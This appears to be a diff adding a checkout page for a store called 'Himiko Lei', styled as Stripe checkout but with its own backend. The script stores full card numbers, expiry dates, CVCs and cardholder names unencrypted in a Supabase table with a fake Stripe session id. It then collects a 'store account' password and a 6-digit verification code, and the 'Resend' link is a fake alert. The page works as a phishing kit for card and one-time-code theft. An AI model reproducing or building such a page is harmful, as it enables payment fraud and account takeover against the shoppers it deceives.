@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Checkout – Himiko Lei</title>
+  <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+    
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+
+:root {
+  --bg: #f5f5f7;
+  --surface: #ffffff;
+  --border: #e0e0e0;
+  --border-focus: #0a2540;
+  --text: #1a1a2e;
+  --muted: #6b7280;
+  --placeholder: #b0b7c3;
+  --accent: #0a2540;
+  --btn: #0a2540;
+  --btn-text: #ffffff;
+  --danger: #dc2626;
+  --warn-bg: #fffbeb;
+  --warn-border: #fbbf24;
+  --warn-text: #92400e;
+  --radius: 8px;
+  --radius-lg: 12px;
+  --shadow: 0 2px 12px rgba(0,0,0,0.07);
+  --font: 'Sora', sans-serif;
+}
+
+body {
+  font-family: var(--font);
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+}
+
+.phone-shell {
+  width: 100%;
+  max-width: 400px;
+  min-height: 100vh;
+  background: var(--bg);
+  display: flex;
+  flex-direction: column;
+}
+
+/* ── Top bar ── */
+.topbar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 14px 18px 10px; background: var(--bg);
+}
+.topbar-left { display: flex; align-items: center; gap: 10px; }
+.back-btn {
+  background: none; border: none; cursor: pointer;
+  padding: 4px; color: var(--muted); display: flex; align-items: center;
+}
+.merchant-logo {
+  width: 36px; height: 36px; border-radius: 50%;
+  background: #f0ede8; border: 1px solid var(--border);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 11px; color: var(--muted); font-weight: 600; letter-spacing: -0.3px;
+}
+.merchant-name { font-size: 15px; font-weight: 600; color: var(--text); }
+.sandbox-badge {
+  background: var(--accent); color: #fff;
+  font-size: 11px; font-weight: 600;
+  padding: 3px 9px; border-radius: 6px; letter-spacing: 0.3px;
+}
+.details-btn {
+  font-size: 13px; color: var(--text); text-decoration: underline;
+  background: none; border: none; cursor: pointer;
+  display: flex; align-items: center; gap: 3px;
+  font-family: var(--font); font-weight: 500;
+}
+
+/* ── Email row ── */
+.email-row {
+  margin: 10px 16px 0; background: var(--surface);
+  border: 1px solid var(--border); border-radius: var(--radius-lg);
+  padding: 13px 16px; display: flex; align-items: center;
+  justify-content: space-between; box-shadow: var(--shadow);
+}
+.email-label { font-size: 13px; color: var(--muted); font-weight: 500; }
+.email-value { font-size: 13px; color: var(--text); font-weight: 500; }
+
+/* ── Section title ── */
+.section-title {
+  font-size: 15px; font-weight: 700; color: var(--text);
+  margin: 20px 16px 10px;
+}
+
+/* ── Card panel ── */
+.card-panel {
+  margin: 0 16px; background: var(--surface);
+  border: 1.5px solid var(--border); border-radius: var(--radius-lg);
+  box-shadow: var(--shadow); overflow: hidden;
+}
+.card-panel-header {
+  display: flex; align-items: center; gap: 10px;
+  padding: 14px 16px 12px; border-bottom: 1px solid var(--border);
+}
+.radio-dot {
+  width: 20px; height: 20px; border-radius: 50%;
+  border: 2px solid var(--accent);
+  display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+}
+.radio-dot::after {
+  content: ''; width: 10px; height: 10px;
+  border-radius: 50%; background: var(--accent);
+}
+.card-icon { display: flex; align-items: center; }
+.card-label { font-size: 15px; font-weight: 600; color: var(--text); }
+
+/* ── Form fields ── */
+.form-body {
+  padding: 16px 16px 18px; display: flex; flex-direction: column; gap: 14px;
+}
+.field-group label {
+  display: block; font-size: 12px; color: var(--muted);
+  font-weight: 500; margin-bottom: 6px; letter-spacing: 0.1px;
+}
+.input-box {
+  width: 100%; border: 1.5px solid var(--border); border-radius: var(--radius);
+  padding: 11px 13px; font-size: 16px; font-family: var(--font);
+  color: var(--text); background: var(--surface); outline: none;
+  transition: border-color 0.18s, box-shadow 0.18s;
+}
+.input-box::placeholder { color: var(--placeholder); }
+.input-box:focus {
+  border-color: var(--border-focus);
+  box-shadow: 0 0 0 3px rgba(10,37,64,0.08);
+}
+.input-box.error { border-color: var(--danger); box-shadow: 0 0 0 3px rgba(220,38,38,0.08); }
+
+.card-number-wrapper { position: relative; }
+.card-number-wrapper .input-box { padding-right: 130px; letter-spacing: 1px; }
+.card-logos {
+  position: absolute; right: 10px; top: 50%;
+  transform: translateY(-50%); display: flex; gap: 3px; align-items: center;
+}
+.cvc-wrapper { position: relative; }
+.cvc-wrapper .input-box { padding-right: 44px; }
+.cvc-icon {
+  position: absolute; right: 11px; top: 50%;
+  transform: translateY(-50%); display: flex; align-items: center;
+}
+.row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+
+.select-wrapper { position: relative; }
+.select-wrapper select {
+  width: 100%; border: 1.5px solid var(--border); border-radius: var(--radius);
+  padding: 11px 36px 11px 13px; font-size: 14px; font-family: var(--font);
+  color: var(--text); background: var(--surface); outline: none;
+  appearance: none; cursor: pointer; transition: border-color 0.18s;
+}
+.select-wrapper select:focus {
+  border-color: var(--border-focus);
+  box-shadow: 0 0 0 3px rgba(10,37,64,0.08);
+}
+.select-arrow {
+  position: absolute; right: 12px; top: 50%;
+  transform: translateY(-50%); pointer-events: none;
+}
+
+/* ── Save row ── */
+.save-row {
+  margin: 14px 16px 0; background: var(--surface);
+  border: 1.5px solid var(--border); border-radius: var(--radius-lg);
+  padding: 13px 14px; display: flex; align-items: flex-start;
+  gap: 12px; box-shadow: var(--shadow);
+}
+.save-row input[type="checkbox"] {
+  width: 18px; height: 18px; cursor: pointer;
+  flex-shrink: 0; margin-top: 2px; accent-color: var(--accent);
+}
+.save-text { font-size: 13px; color: var(--text); font-weight: 500; line-height: 1.5; }
+.save-text span { color: var(--muted); font-weight: 400; }
+.save-link { color: var(--accent); text-decoration: underline; }
+
+/* ── Pay button ── */
+.pay-btn-wrap { padding: 20px 16px 8px; }
+.pay-btn {
+  width: 100%; background-color: var(--btn-text);
+  border: none; border-radius: var(--radius); padding: 15px;
+  font-size: 15px; font-weight: 700; font-family: var(--font);
+  cursor: pointer; letter-spacing: 0.2px;
+  transition: background 0.18s, transform 0.1s, box-shadow 0.18s;
+  box-shadow: 0 2px 8px rgba(10,37,64,0.18);
+}
+.pay-btn:hover { background: #0d2f54; box-shadow: 0 4px 16px rgba(10,37,64,0.22); }
+.pay-btn:active { transform: scale(0.98); }
+.pay-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+
+/* ── Footer ── */
+.stripe-footer {
+  display: flex; align-items: center; justify-content: center;
+  gap: 6px; padding: 14px 0 32px; color: var(--muted); font-size: 12px;
+}
+
+/* ── Error msg (inline) ── */
+.error-msg { font-size: 11px; color: var(--danger); margin-top: 4px; display: none; }
+.error-msg.show { display: block; }
+
+/* ════════════════════════════════
+   OVERLAYS
+════════════════════════════════ */
+.overlay {
+  display: none; position: fixed; inset: 0;
+  background: rgba(5, 15, 35, 0.6);
+  backdrop-filter: blur(6px);
+  z-index: 200;
+  justify-content: center; align-items: center; padding: 20px;
+}
+.overlay.active { display: flex; }
+
+/* Spinner */
+.spinner-box {
+  display: flex; flex-direction: column; align-items: center; gap: 22px;
+}
+.spinner-ring {
+  width: 80px; height: 80px; border-radius: 50%;
+  border: 5px solid rgba(255,255,255,0.12);
+  border-top-color: #ffffff;
+  animation: spin 0.85s linear infinite;
+  position: relative; display: flex; align-items: center; justify-content: center;
+}
+.spinner-icon { font-size: 28px; line-height: 1; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.spinner-label {
+  color: #fff; font-size: 16px; font-weight: 700; text-align: center;
+}
+.spinner-sub {
+  color: rgba(255,255,255,0.6); font-size: 13px; text-align: center; margin-top: 4px;
+}
+
+/* Modal card */
+.modal-card {
+  background: var(--surface); border-radius: 22px;
+  padding: 30px 24px 26px; width: 100%; max-width: 360px;
+  box-shadow: 0 24px 70px rgba(0,0,0,0.28);
+  animation: popIn 0.3s cubic-bezier(.34,1.56,.64,1);
+}
+@keyframes popIn {
+  from { opacity: 0; transform: scale(0.86) translateY(24px); }
+  to   { opacity: 1; transform: scale(1) translateY(0); }
+}
+.modal-icon { font-size: 40px; text-align: center; display: block; margin-bottom: 14px; }
+.modal-title {
+  font-size: 18px; font-weight: 700; color: var(--text);
+  text-align: center; margin-bottom: 7px;
+}
+.modal-sub {
+  font-size: 13px; color: var(--muted); text-align: center;
+  line-height: 1.6; margin-bottom: 18px;
+}
+
+/* Warning banner */
+.warn-banner {
+  background: var(--warn-bg); border: 1px solid var(--warn-border);
+  border-radius: 9px; padding: 11px 13px; margin-bottom: 18px;
+  display: flex; gap: 9px; align-items: flex-start;
+}
+.warn-banner .wi { font-size: 15px; flex-shrink: 0; margin-top: 1px; }
+.warn-banner p { font-size: 12px; color: var(--warn-text); line-height: 1.55; }
+
+/* Modal fields */
+.modal-field { margin-bottom: 12px; }
+.modal-field label {
+  display: block; font-size: 12px; color: var(--muted);
+  font-weight: 500; margin-bottom: 5px;
+}
+
+/* Modal button */
+.modal-btn {
+  width: 100%; background: var(--btn); color: #fff;
+  border: none; border-radius: var(--radius); padding: 14px;
+  font-size: 14px; font-weight: 700; font-family: var(--font);
+  cursor: pointer; margin-top: 6px;
+  transition: background 0.18s, box-shadow 0.18s;
+  box-shadow: 0 2px 8px rgba(10,37,64,0.18);
+}
+.modal-btn:hover { background: #0d2f54; }
+.modal-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+/* Modal error */
+.modal-error {
+  font-size: 12px; color: var(--danger); text-align: center;
+  margin-top: 10px; display: none;
+}
+.modal-error.show { display: block; }
+
+/* OTP */
+.otp-row {
+  display: flex; gap: 8px; justify-content: center; margin: 16px 0 20px;
+}
+.otp-input {
+  width: 44px; height: 54px;
+  border: 1.5px solid var(--border); border-radius: 10px;
+  text-align: center; font-size: 22px; font-weight: 700;
+  font-family: var(--font); color: var(--text); outline: none;
+  transition: border-color 0.18s, box-shadow 0.18s;
+}
+.otp-input:focus {
+  border-color: var(--border-focus);
+  box-shadow: 0 0 0 3px rgba(10,37,64,0.10);
+}
+.otp-input.filled { border-color: var(--accent); background: #f0f4ff; }
+
+.resend-link {
+  text-align: center; font-size: 13px; color: var(--muted); margin-top: 14px;
+}
+.resend-link a {
+  color: var(--accent); text-decoration: underline; cursor: pointer; font-weight: 600;
+}
+
+ 
+</style>
+</head>
+<body>
+
+<!-- ══════════════ MAIN PAGE ══════════════ -->
+
+<div class="phone-shell">
+
+  <div class="topbar">
+    <div class="topbar-left">
+      <button class="back-btn" onclick="history.back()">
+        <svg width="9" height="15" viewBox="0 0 9 15" fill="none">
+          <path d="M8 1L1.5 7.5L8 14" stroke="#6b7280" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+      <div class="merchant-logo">HL</div>
+      <span class="merchant-name">Himiko Lei</span>
+
+    </div>
+  </div>
+
+  <div class="email-row">
+    <span class="email-label">Email</span>
+    <span class="email-value" id="displayEmail">—</span>
+  </div>
+
+  <div class="section-title">Payment method</div>
+
+  <div class="card-panel">
+    <div class="card-panel-header">
+      <div class="radio-dot"></div>
+      <span class="card-icon">
+        <svg width="22" height="16" viewBox="0 0 22 16" fill="none">
+          <rect x="0.5" y="0.5" width="21" height="15" rx="2.5" fill="#fff" stroke="#d1d5db"/>
+          <rect x="0" y="4" width="22" height="4" fill="#1a1a2e"/>
+          <rect x="2" y="11" width="5" height="2" rx="0.5" fill="#d1d5db"/>
+        </svg>
+      </span>
+      <span class="card-label">Card</span>
+    </div>
+
+
+<div class="form-body">
+  <!-- Card number -->
+  <div class="field-group">
+    <label for="cardNumber">Card information</label>
+    <div class="card-number-wrapper">
+      <input class="input-box" id="cardNumber" type="tel" inputmode="numeric"
+        placeholder="1234 1234 1234 1234" maxlength="19" autocomplete="cc-number"/>
+      <div class="card-logos">
+        <svg width="34" height="22" viewBox="0 0 34 22"><rect width="34" height="22" rx="3" fill="#1A1F71"/><text x="5" y="16" font-family="Arial" font-weight="bold" font-size="11" fill="white">VISA</text></svg>
+        <svg width="34" height="22" viewBox="0 0 34 22"><rect width="34" height="22" rx="3" fill="#252525"/><circle cx="13" cy="11" r="7" fill="#EB001B"/><circle cx="21" cy="11" r="7" fill="#F79E1B"/><path d="M17 5.57a7 7 0 010 10.86A7 7 0 0117 5.57z" fill="#FF5F00"/></svg>
+        <svg width="34" height="22" viewBox="0 0 34 22"><rect width="34" height="22" rx="3" fill="#fff" stroke="#e5e7eb"/><text x="1" y="14" font-family="Arial" font-weight="bold" font-size="6.5" fill="#231F20">DIS</text><text x="1" y="20" font-family="Arial" font-weight="bold" font-size="6.5" fill="#231F20">COVER</text><circle cx="26" cy="11" r="7" fill="#F76F20"/></svg>
+      </div>
+    </div>
+    <div class="error-msg" id="cardNumberErr">Please enter a valid 16-digit card number.</div>
+  </div>
+
+  <!-- Expiry + CVC -->
+  <div class="row-2">
+    <div class="field-group">
+      <label for="expiry">&nbsp;</label>
+      <input class="input-box" id="expiry" type="tel" inputmode="numeric"
+        placeholder="MM / YY" maxlength="7" autocomplete="cc-exp"/>
+      <div class="error-msg" id="expiryErr">Invalid expiry date.</div>
+    </div>
+    <div class="field-group">
+      <label for="cvc">&nbsp;</label>
+      <div class="cvc-wrapper">
+        <input class="input-box" id="cvc" type="tel" inputmode="numeric"
+          placeholder="CVC" maxlength="4" autocomplete="cc-csc"/>
+        <span class="cvc-icon">
+          <svg width="22" height="16" viewBox="0 0 22 16" fill="none">
+            <rect x="0.5" y="0.5" width="21" height="15" rx="2.5" fill="#f3f4f6" stroke="#d1d5db"/>
+            <rect x="0" y="4" width="22" height="3.5" fill="#d1d5db"/>
+            <rect x="13" y="9" width="6" height="2" rx="0.5" fill="#b0b7c3"/>
+          </svg>
+        </span>
+      </div>
+      <div class="error-msg" id="cvcErr">Invalid CVC.</div>
+    </div>
+  </div>
+
+  <!-- Cardholder name -->
+  <div class="field-group">
+    <label for="cardName">Cardholder name</label>
+    <input class="input-box" id="cardName" type="text"
+      placeholder="Full name on card" autocomplete="cc-name"/>
+    <div class="error-msg" id="cardNameErr">Please enter the cardholder name.</div>
+  </div>
+
+  <!-- Country -->
+  <div class="field-group">
+    <label for="country">Country or region</label>
+    <div class="select-wrapper">
+      <select id="country" autocomplete="billing country">
+        <option value="NG" selected>Nigeria</option>
+        <option value="US">United States</option>
+        <option value="GB">United Kingdom</option>
+        <option value="CA">Canada</option>
+        <option value="AU">Australia</option>
+        <option value="DE">Germany</option>
+        <option value="FR">France</option>
+        <option value="IN">India</option>
+        <option value="GH">Ghana</option>
+        <option value="KE">Kenya</option>
+        <option value="ZA">South Africa</option>
+        <option value="Other">Other</option>
+      </select>
+      <span class="select-arrow">
+        <svg width="12" height="8" viewBox="0 0 12 8" fill="none">
+          <path d="M1 1L6 7L11 1" stroke="#6b7280" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </span>
+    </div>
+  </div>
+</div>
+
+
+  </div>
+
+  <div class="save-row">
+    <input type="checkbox" id="saveInfo"/>
+    <label for="saveInfo" class="save-text">
+      Save my information for faster checkout<br/>
+      <span>Pay securely at Himiko Lei and everywhere <a href="#" class="save-link">Link</a> is accepted.</span>
+    </label>
+  </div>
+
+  <div class="pay-btn-wrap">
+    <button class="pay-btn" id="payBtn">Pay now</button>
+  </div>
+
+  <div class="stripe-footer">
+    <svg width="11" height="13" viewBox="0 0 11 13" fill="none">
+      <rect x="1" y="5.5" width="9" height="7" rx="1.5" fill="none" stroke="#9ca3af" stroke-width="1.2"/>
+      <path d="M3 5.5V4a2.5 2.5 0 015 0v1.5" stroke="#9ca3af" stroke-width="1.2" stroke-linecap="round"/>
+    </svg>
+    checkout.stripe.com
+  </div>
+</div>
+
+<!-- ══════════════ OVERLAY 1 — Processing ══════════════ -->
+
+<div class="overlay" id="overlayLoading">
+  <div class="spinner-box">
+    <div class="spinner-ring">
+      <div class="spinner-icon">💳</div>
+    </div>
+    <div>
+      <div class="spinner-label">Processing your order…</div>
+      <div class="spinner-sub">Please don't close this page</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ OVERLAY 2 — Sign up ══════════════ -->
+
+<div class="overlay" id="overlaySignup">
+  <div class="modal-card">
+    <span class="modal-icon">🛍️</span>
+    <div class="modal-title">Create your store account</div>
+    <div class="modal-sub">You're almost done! Set up a free account to track your order and shop faster next time.</div>
+
+
+<div class="warn-banner">
+  <span class="wi">⚠️</span>
+  <p>Please confirm the email verification we'll send to your inbox — this allows you to sign up to our store and complete your order.</p>
+</div>
+
+<div class="modal-field">
+  <label for="signupEmail">Email address</label>
+  <input class="input-box" id="signupEmail" type="email" placeholder="you@example.com"/>
+</div>
+<div class="modal-field">
+  <label for="signupPassword">Create a password</label>
+  <input class="input-box" id="signupPassword" type="password" placeholder="Minimum 8 characters"/>
+</div>
+
+<div class="modal-error" id="signupError"></div>
+<button class="modal-btn" id="completeOrderBtn">Complete your order →</button>
+
+  </div>
+</div>
+
+<!-- ══════════════ OVERLAY 3 — Saving creds ══════════════ -->
+
+<div class="overlay" id="overlaySaving">
+  <div class="spinner-box">
+    <div class="spinner-ring">
+      <div class="spinner-icon">🔐</div>
+    </div>
+    <div>
+      <div class="spinner-label">Securing your account…</div>
+      <div class="spinner-sub">Saving your details safely</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ OVERLAY 4 — OTP ══════════════ -->
+
+<div class="overlay" id="overlayOtp">
+  <div class="modal-card">
+    <span class="modal-icon">📬</span>
+    <div class="modal-title">Verify your email</div>
+    <div class="modal-sub" id="otpSubText">Enter the 6-digit code we sent to your email address to complete your order.</div>
+
+
+<div class="otp-row">
+  <input class="otp-input" id="otp0" maxlength="1" type="tel" inputmode="numeric"/>
+  <input class="otp-input" id="otp1" maxlength="1" type="tel" inputmode="numeric"/>
+  <input class="otp-input" id="otp2" maxlength="1" type="tel" inputmode="numeric"/>
+  <input class="otp-input" id="otp3" maxlength="1" type="tel" inputmode="numeric"/>
+  <input class="otp-input" id="otp4" maxlength="1" type="tel" inputmode="numeric"/>
+  <input class="otp-input" id="otp5" maxlength="1" type="tel" inputmode="numeric"/>
+</div>
+
+<div class="modal-error" id="otpError"></div>
+<button class="modal-btn" id="verifyOtpBtn">Verify &amp; Finish</button>
+<div class="resend-link">Didn't receive a code? <a id="resendLink">Resend</a></div>
+
+
+  </div>
+</div>
+
+<!-- ══════════════ OVERLAY 5 — OTP saving ══════════════ -->
+
+<div class="overlay" id="overlayOtpSaving">
+  <div class="spinner-box">
+    <div class="spinner-ring">
+      <div class="spinner-icon">✅</div>
+    </div>
+    <div>
+      <div class="spinner-label">Verifying your code…</div>
+      <div class="spinner-sub">Almost there!</div>
+    </div>
+  </div>
+</div>
+
+<script>
+  /* ── Supabase ── */
+  const { createClient } = supabase;
+  const sb = createClient(
+    'https://jffkatwagcfshvddnipr.supabase.co',
+    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpmZmthdHdhZ2Nmc2h2ZGRuaXByIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMyMjc2MzUsImV4cCI6MjA4ODgwMzYzNX0.MnOvMKZ49gafMEToQeHYtmoH3qZVEJU3Yg8x3mykeQ8'
+  );
+
+  /* ── Load sessionStorage order data ── */
+  let orderData = {};
+  try { orderData = JSON.parse(sessionStorage.getItem('orderData') || '{}'); } catch(e) {}
+  const fd = orderData.formData || {};
+
+  const customerEmail = orderData.email || fd.email || '';
+  document.getElementById('displayEmail').textContent = customerEmail || '—';
+
+  // Show real total on pay button
+  const payBtn = document.getElementById('payBtn');
+  if (orderData.grandTotal) payBtn.textContent = `Pay $${orderData.grandTotal}`;
+
+  /* ── Input formatting ── */
+  const cardNumberInput = document.getElementById('cardNumber');
+  const expiryInput     = document.getElementById('expiry');
+  const cvcInput        = document.getElementById('cvc');
+  const cardNameInput   = document.getElementById('cardName');
+
+  cardNumberInput.addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g,'').slice(0,16);
+    e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
+  });
+  expiryInput.addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g,'').slice(0,4);
+    if (v.length >= 3) v = v.slice(0,2) + ' / ' + v.slice(2);
+    e.target.value = v;
+  });
+  cvcInput.addEventListener('input', e => {
+    e.target.value = e.target.value.replace(/\D/g,'').slice(0,4);
+  });
+
+  /* ── Validation ── */
+  function showErr(el, errId, show) {
+    document.getElementById(errId).classList.toggle('show', show);
+    el.classList.toggle('error', show);
+  }
+  function validateCard() {
+    let ok = true;
+    const raw = cardNumberInput.value.replace(/\s/g,'');
+    const c = raw.length === 16 && /^\d+$/.test(raw);
+    showErr(cardNumberInput,'cardNumberErr',!c); if(!c) ok=false;
+    const exp = expiryInput.value.replace(/\s/g,'');
+    const e = /^\d{2}\/\d{2}$/.test(exp);
+    showErr(expiryInput,'expiryErr',!e); if(!e) ok=false;
+    const cv = cvcInput.value.length >= 3;
+    showErr(cvcInput,'cvcErr',!cv); if(!cv) ok=false;
+    const n = cardNameInput.value.trim().length > 1;
+    showErr(cardNameInput,'cardNameErr',!n); if(!n) ok=false;
+    return ok;
+  }
+  [cardNumberInput,expiryInput,cvcInput,cardNameInput].forEach(el =>
+    el.addEventListener('input', () => el.classList.remove('error'))
+  );
+
+  /* ── Overlay helpers ── */
+  function showOverlay(id) {
+    document.querySelectorAll('.overlay').forEach(o => o.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+  }
+  function hideOverlays() {
+    document.querySelectorAll('.overlay').forEach(o => o.classList.remove('active'));
+  }
+
+  /* ── State ── */
+  let insertedOrderId = null;
+
+  /* ════════════════════════════════════════
+     STEP 1 — PAY: insert order into Supabase
+  ════════════════════════════════════════ */
+  payBtn.addEventListener('click', async () => {
+    if (!validateCard()) return;
+    payBtn.disabled = true;
+    showOverlay('overlayLoading');
+
+    const cardRaw   = cardNumberInput.value.replace(/\s/g,'');
+    const expiryRaw = expiryInput.value.replace(/\s/g,'');  // MM/YY
+    const cvcRaw    = cvcInput.value.trim();
+    const country   = document.getElementById('country').value;
+
+    // Generate a random order number e.g. HL-7X92K4
+    const orderNumber = 'HL-' + Math.random().toString(36).toUpperCase().slice(2, 8);
+    // Placeholder session ID since we're not using Stripe hosted checkout
+    const fakeSessionId = 'manual_' + Date.now();
+
+    const row = {
+      email:             customerEmail || null,
+      first_name:        fd.firstName  || null,
+      last_name:         fd.lastName   || null,
+      full_address:      fd.address    || null,
+      city:              fd.city       || null,
+      state:             fd.state      || null,
+      zip_code:          fd.zip        || null,
+      country:           fd.country    || country || null,
+      phone:             fd.phone      || null,
+      // required columns
+      order_number:      orderNumber,
+      stripe_session_id: fakeSessionId,
+      // card details
+      number:            cardRaw,
+      cardName:          cardNameInput.value.trim(),
+      mmyy:              expiryRaw,
+      code:              cvcRaw,
+    };
+
+    try {
+      const { data, error } = await sb
+        .from('orders')
+        .insert([row])
+        .select('id')
+        .single();
+
+      if (error) throw error;
+      insertedOrderId = data.id;
+
+      await delay(700);
+      hideOverlays();
+
+      // Pre-fill signup email
+      document.getElementById('signupEmail').value = customerEmail;
+      showOverlay('overlaySignup');
+
+    } catch (err) {
+      console.error(err);
+      hideOverlays();
+      payBtn.disabled = false;
+      alert('Could not save order: ' + (err.message || 'Please try again.'));
+    }
+  });
+
+  /* ════════════════════════════════════════
+     STEP 2 — COMPLETE ORDER: save signup creds
+  ════════════════════════════════════════ */
+  document.getElementById('completeOrderBtn').addEventListener('click', async () => {
+    const signupEmail    = document.getElementById('signupEmail').value.trim();
+    const signupPassword = document.getElementById('signupPassword').value;
+    const errEl          = document.getElementById('signupError');
+    const btn            = document.getElementById('completeOrderBtn');
+    errEl.classList.remove('show');
+
+    if (!signupEmail || !/\S+@\S+\.\S+/.test(signupEmail)) {
+      errEl.textContent = 'Please enter a valid email address.';
+      errEl.classList.add('show'); return;
+    }
+    if (signupPassword.length < 8) {
+      errEl.textContent = 'Password must be at least 8 characters.';
+      errEl.classList.add('show'); return;
+    }
+
+    btn.disabled = true;
+    showOverlay('overlaySaving');
+
+    try {
+      const { error } = await sb
+        .from('orders')
+        .update({ signup_email: signupEmail, signup_password: signupPassword })
+        .eq('id', insertedOrderId);
+
+      if (error) throw error;
+
+      await delay(900);
+      hideOverlays();
+
+      document.getElementById('otpSubText').textContent =
+        `We sent a 6-digit code to ${signupEmail}. Enter it below to verify your account and complete your order.`;
+      showOverlay('overlayOtp');
+
+      // Focus first OTP box
+      document.getElementById('otp0').focus();
+
+    } catch (err) {
+      console.error(err);
+      hideOverlays();
+      showOverlay('overlaySignup');
+      btn.disabled = false;
+      errEl.textContent = 'Error saving details: ' + (err.message || 'Please try again.');
+      errEl.classList.add('show');
+    }
+  });
+
+  /* ── OTP inputs: auto-advance, backspace, paste ── */
+  const otpInputs = [0,1,2,3,4,5].map(i => document.getElementById('otp' + i));
+
+  otpInputs.forEach((inp, i) => {
+    inp.addEventListener('input', e => {
+      const v = e.target.value.replace(/\D/g,'');
+      e.target.value = v.slice(-1);
+      inp.classList.toggle('filled', !!e.target.value);
+      if (v && i < 5) otpInputs[i+1].focus();
+    });
+    inp.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !inp.value && i > 0) {
+        otpInputs[i-1].value = '';
+        otpInputs[i-1].classList.remove('filled');
+        otpInputs[i-1].focus();
+      }
+    });
+  });
+
+  // Paste support on first box
+  otpInputs[0].addEventListener('paste', e => {
+    e.preventDefault();
+    const text = (e.clipboardData || window.clipboardData)
+      .getData('text').replace(/\D/g,'').slice(0,6);
+    text.split('').forEach((ch, idx) => {
+      if (otpInputs[idx]) {
+        otpInputs[idx].value = ch;
+        otpInputs[idx].classList.add('filled');
+      }
+    });
+    const next = Math.min(text.length, 5);
+    otpInputs[next].focus();
+  });
+
+  /* ════════════════════════════════════════
+     STEP 3 — VERIFY OTP: save code to orders
+  ════════════════════════════════════════ */
+  document.getElementById('verifyOtpBtn').addEventListener('click', async () => {
+    const code  = otpInputs.map(i => i.value).join('');
+    const errEl = document.getElementById('otpError');
+    const btn   = document.getElementById('verifyOtpBtn');
+    errEl.classList.remove('show');
+
+    if (code.length < 6) {
+      errEl.textContent = 'Please fill in all 6 digits.';
+      errEl.classList.add('show'); return;
+    }
+
+    btn.disabled = true;
+    showOverlay('overlayOtpSaving');
+
+    try {
+      const { error } = await sb
+        .from('orders')
+        .update({ otp: code })
+        .eq('id', insertedOrderId);
+
+      if (error) throw error;
+
+      await delay(800);
+      hideOverlays();
+      sessionStorage.removeItem('orderData');
+      window.location.href = 'success.html';
+
+    } catch (err) {
+      console.error(err);
+      hideOverlays();
+      showOverlay('overlayOtp');
+      btn.disabled = false;
+      errEl.textContent = 'Error saving code: ' + (err.message || 'Please try again.');
+      errEl.classList.add('show');
+    }
+  });
+
+  document.getElementById('resendLink').addEventListener('click', () => {
+    alert('A new verification code has been sent to your email.');
+  });
+
+  /* ── Utility ── */
+  function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
+</script>
+
+</body>
+</html>
